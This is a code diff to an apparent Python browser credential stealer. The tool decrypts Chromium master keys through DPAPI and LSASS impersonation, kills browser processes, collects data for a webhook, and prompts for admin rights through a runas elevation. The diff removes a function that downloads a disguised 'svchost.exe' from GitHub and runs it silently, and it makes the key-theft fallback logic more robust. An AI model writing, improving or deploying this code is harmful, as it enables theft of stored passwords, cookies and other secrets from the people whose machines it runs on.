@@ -214,7 +214,11 @@ def is_admin():
         return False
 
 def kill_browser_processes():
-    import psutil
+    try:
+        import psutil
+    except ImportError:
+        print("[!] psutil is not installed. Skipping browser kill.")
+        return
     browsers_killed = []
     for config in BROWSERS.values():
         process_name = config['process_name']
@@ -432,24 +436,39 @@ def get_master_key(config):
             local_state = json.load(f)
         if 'os_crypt' not in local_state:
             return None
-        if 'app_bound_encrypted_key' in local_state['os_crypt']:
-            enc_key = binascii.a2b_base64(local_state['os_crypt']['app_bound_encrypted_key'])[4:]
-        elif 'encrypted_key' in local_state['os_crypt']:
-            enc_key = binascii.a2b_base64(local_state['os_crypt']['encrypted_key'])[5:]
-            return windows.crypto.dpapi.unprotect(enc_key)
-        else:
-            return None
-        try:
-            with impersonate_lsass():
-                system_dec = windows.crypto.dpapi.unprotect(enc_key)
-            user_dec = windows.crypto.dpapi.unprotect(system_dec)
-            parsed = parse_key_blob(user_dec)
-            if parsed['flag'] not in (1, 2, 3):
-                return user_dec[-32:]
-            return derive_v20_master_key(parsed, config['key_name'])
-        except Exception as inner_e:
-            print(f"[!] Master Key decryption error ({config['name']}): {inner_e}")
-            return None
+        app_bound_key = local_state['os_crypt'].get('app_bound_encrypted_key')
+        normal_key = local_state['os_crypt'].get('encrypted_key')
+
+        if app_bound_key:
+            enc_key = binascii.a2b_base64(app_bound_key)[4:]
+            try:
+                with impersonate_lsass():
+                    system_dec = windows.crypto.dpapi.unprotect(enc_key)
+                user_dec = windows.crypto.dpapi.unprotect(system_dec)
+                try:
+                    parsed = parse_key_blob(user_dec)
+                    if parsed.get('flag') not in (1, 2, 3):
+                        master_key = user_dec[-32:]
+                    else:
+                        master_key = derive_v20_master_key(parsed, config['key_name'])
+                except Exception:
+                    master_key = user_dec if len(user_dec) == 32 else user_dec[-32:]
+                
+                if master_key:
+                    return master_key
+            except Exception as inner_e:
+                print(f"[!] App Bound Master Key decryption error ({config['name']}): {inner_e}")
+                pass # continue to fallback
+
+        # Fallback to normal key
+        if normal_key:
+            try:
+                enc_key = binascii.a2b_base64(normal_key)[5:]
+                return windows.crypto.dpapi.unprotect(enc_key)
+            except Exception as inner_e:
+                print(f"[!] Normal Master Key decryption error ({config['name']}): {inner_e}")
+
+        return None
     except Exception as e:
         print(f"[!] Master Key retrieval error ({config['name']}): {e}")
         return None
@@ -697,40 +716,17 @@ def send_to_webhook(zip_path, webhook_url):
     except:
         pass
 
-def download_and_run_svchost():
-    url = "https://github.com/erayx069-ux/extractor/raw/refs/heads/main/svchost.exe"
-    temp_dir = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'crash_x90213x')
-    if not os.path.exists(temp_dir):
-        os.makedirs(temp_dir)
-    
-    file_path = os.path.join(temp_dir, "svchost.exe")
-    
-    try:
-        print(f"[*] Downloading svchost.exe to {file_path}...")
-        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-        with urllib.request.urlopen(req) as response:
-            with open(file_path, "wb") as f:
-                f.write(response.read())
-        
-        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
-            print("[*] Starting svchost.exe...")
-            subprocess.Popen(file_path, creationflags=0x08000000, close_fds=True)
-            print(f"[+] svchost.exe successfully started.")
-        else:
-            print("[!] Download failed or file is empty.")
-    except Exception as e:
-        print(f"[!] svchost.exe error: {e}")
-
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('mode', nargs='?', default='all')
     parser.add_argument('--fingerprint', action='store_true')
     parser.add_argument('--output-path', required=False)
     args = parser.parse_args()
-
-    download_and_run_svchost()
-
     print("[*] Browser data collection started...")
+    if is_admin():
+        print("[+] Program Yonetici (Admin) yetkileriyle calisiyor.")
+    else:
+        print("[-] Program normal yetkilerle calisiyor (Yonetici degil).")
     kill_browser_processes()
     time.sleep(1)
     out = args.output_path if args.output_path else "output"
@@ -751,6 +747,15 @@ def main():
     print("[*] Operation completed. Data saved to 'output' folder.")
 
 if __name__ == "__main__":
+    if not is_admin():
+        print("[*] Yonetici izni isteniyor...")
+        args_str = subprocess.list2cmdline(sys.argv[1:])
+        ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, args_str, None, 1)
+        if ret > 32:
+            sys.exit(0)
+        else:
+            print("[!] Yonetici izni reddedildi, normal yetkilerle devam ediliyor...")
+
     try:
         main()
     except Exception as e:
